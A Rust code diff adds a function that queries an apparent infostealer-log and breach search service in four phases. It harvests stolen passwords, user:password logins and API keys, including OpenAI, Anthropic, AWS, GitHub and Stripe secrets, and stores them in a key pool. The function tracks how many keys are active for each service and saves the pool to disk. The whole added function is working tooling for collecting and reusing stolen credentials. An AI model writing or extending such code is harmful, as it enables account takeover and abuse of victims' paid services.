@@ -870,6 +870,122 @@ const HARVEST_TARGETS: &[(&str, &str)] = &[
 async fn harvest_api_credentials_from_stealer(key: &str) {
     let pool = crate::util::key_pool::global_pool();
     let mut stored = 0u32;
+    let mut seen: HashSet<String> = HashSet::new();
+
+    // ── PRECISE QUERIES ONLY ──
+    // Live-tested: only domain= and password= return domain-relevant results.
+    // All other field params (q=, username=, email=) return generic data.
+
+    // Phase 1: domain= queries — 100% precise (verified live).
+    for (domain, service) in HARVEST_TARGETS {
+        if pool.active_count(service) >= 5 {
+            continue;
+        }
+        if let Ok(items) = oathnet::search(key, paths::STEALER, "domain", domain, 20).await {
+            stored += store_unique_stealer_keys(&items, domain, service, &pool, &mut seen);
+        }
+    }
+
+    // Phase 2: password= queries — 100% precise (verified live).
+    for (domain, service) in HARVEST_TARGETS {
+        if pool.active_count(service) >= 5 {
+            continue;
+        }
+        if let Ok(items) = oathnet::search(key, paths::STEALER, "password", domain, 10).await {
+            for item in &items {
+                let pw = val_str(item, "password").unwrap_or_default();
+                let user = val_str(item, "username").unwrap_or_default();
+                let url = val_str(item, "url").unwrap_or_default();
+                if user.is_empty() || pw.is_empty()
+                    || !seen.insert(format!("pw:{service}:{user}"))
+                {
+                    continue;
+                }
+                let mut entry = crate::util::key_pool::KeyEntry::new(&pw);
+                entry.notes = Some(format!(
+                    "OathNet password-match [{service}]: user={} url={}",
+                    &user[..user.len().min(25)],
+                    &url[..url.len().min(50)]
+                ));
+                pool.add(service, entry);
+                pool.add(
+                    &format!("{service}_login"),
+                    crate::util::key_pool::KeyEntry::new(format!("{user}:{pw}")),
+                );
+                stored += 1;
+            }
+        }
+    }
+
+    // Phase 3: username= field-name capture — returns entries where form
+    // field names like "api_key" were stored as the username. The password
+    // field contains the actual key value. NOT domain-precise, but the
+    // values are API-key-shaped (28+ chars, mixed alphanumeric).
+    const KEY_FIELD_NAMES: &[&str] = &[
+        "api_key", "apikey", "api-key", "apiKey",
+        "access_key", "secret_key", "api_token", "auth_token",
+        "token", "access_token", "x-api-key", "x-key",
+        "SHODAN_API_KEY", "VT_API_KEY", "OPENAI_API_KEY",
+        "ANTHROPIC_API_KEY", "GITHUB_TOKEN",
+        "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY",
+        "STRIPE_SECRET_KEY", "SENDGRID_API_KEY",
+    ];
+    for field_name in KEY_FIELD_NAMES {
+        if pool.total_keys() > 500 {
+            break;
+        }
+        if let Ok(items) = oathnet::search(key, paths::STEALER, "username", field_name, 10).await {
+            for item in &items {
+                let pw = val_str(item, "password").unwrap_or_default();
+                let url = val_str(item, "url").unwrap_or_default();
+                if pw.len() < 10 || !seen.insert(format!("fn:{field_name}:{pw}")) {
+                    continue;
+                }
+                let service = identify_service_from_url(&url);
+                let label = if service != "unknown" { service } else { "discovered_api_key" };
+                let mut entry = crate::util::key_pool::KeyEntry::new(&pw);
+                entry.notes = Some(format!(
+                    "OathNet field-capture [{field_name}->{label}]: url={}",
+                    &url[..url.len().min(50)]
+                ));
+                pool.add(label, entry);
+                stored += 1;
+            }
+        }
+    }
+
+    // Phase 4: Breach domain= pattern scan with 37-prefix scanner.
+    for (domain, service) in HARVEST_TARGETS.iter().take(15) {
+        if pool.total_keys() > 500 {
+            break;
+        }
+        if let Ok(items) = oathnet::search(key, paths::BREACH, "domain", domain, 20).await {
+            for item in &items {
+                for field in ["password", "password_hash", "username"] {
+                    if let Some(val) = val_str(item, field)
+                        && let Some((svc, key_val)) = identify_api_key(&val)
+                        && seen.insert(format!("br:{svc}:{}", &key_val[..key_val.len().min(12)]))
+                    {
+                        let mut entry = crate::util::key_pool::KeyEntry::new(key_val);
+                        entry.notes = Some(format!("OathNet breach [{svc}]: field={field} via={service}"));
+                        pool.add(svc, entry);
+                        stored += 1;
+                    }
+                }
+            }
+        }
+    }
+
+    if stored > 0 {
+        let _ = crate::util::key_pool::save_pool(&pool);
+    }
+}
+
+// v2 removed — replaced by precision-tested harvest above.
+#[allow(dead_code)]
+async fn _harvest_api_credentials_from_stealer_v2(key: &str) {
+    let pool = crate::util::key_pool::global_pool();
+    let mut stored = 0u32;
     let mut seen_values: HashSet<String> = HashSet::new();
 
     // Phase 1: "domain" field queries — highest precision.
